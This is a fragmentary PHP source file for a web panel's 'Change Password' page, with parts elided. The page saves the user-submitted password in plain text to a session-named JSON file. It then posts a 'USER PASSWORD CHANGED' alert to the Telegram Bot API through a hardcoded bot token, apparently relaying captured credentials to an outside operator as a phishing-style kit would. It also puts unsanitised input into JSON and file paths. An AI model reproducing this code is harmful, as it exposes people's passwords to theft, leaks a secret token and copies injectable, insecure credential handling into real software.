...
echo"<meta http-equiv='refresh' content='0;url=login.php?s=botalert'>";

}else{
    $user="ntpcbdjsjsj8272djearning/$session/bot.txt";
$tgids=file_get_contents($user);
			...
			<div class="head-title">
				<div class="left">
					...
					<ul class="breadcrumb">
						...
						<li>
							<a class="active" href="home.php">Home</a>/Change Password
						</li>
					</ul>
				</div>
...
<span class="login100-form-title p-b-25" style="font-size:25px !important; font-family: "Corben", cursive;">
        <center>
     <h4 style="font-weight: 600; font-size: 1rem; color: Green;  padding-top:3px; padding-bottom:3px; width:70%;" >
     <?php

$dfile="ussddbdjsjsj8272djearning/$session.json";
if(file_exists($dfile)){
    echo'<center>PASSWORD CHANGE SUCCESS<br><br>Redirecting to Home...</center><meta http-equiv="refresh" content="1 url=home.php">';
}else{
        echo'<center>PASS CHANGED ADDED<br><br>Redirecting to Home...</center><meta http-equiv="refresh" content="1 url=home.php">';
}

$tgg=$_GET['news'];
fopen("ussddbdjsjsj8272djearning/$session.json",'a');
$tgg=$_POST['news'];

$tgggt='{"pass":"'.$tgg.'","status":"yes"}';

file_put_contents("ussddbdjsjsj8272djearning/$session.json",$tgggt);
$msgt='⚠️ *USER PASSWORD CHANGED* ⚠️
...
' ;
 $tes5t=urlencode($msgtg);
 
 
 
 $url99='https://api.telegram.org/bot5744252018:AAGEHVkHtuIefEs6h2v0PkFWWMzmD3Zg7zA/sendMessage?chat_id='.$tgids.'&text='.$tes5t.'&parse_mode=markdown';
$headers[]='user-agent: Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36';
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url99);
curl_setopt($ch,CURLOPT_POST,1);
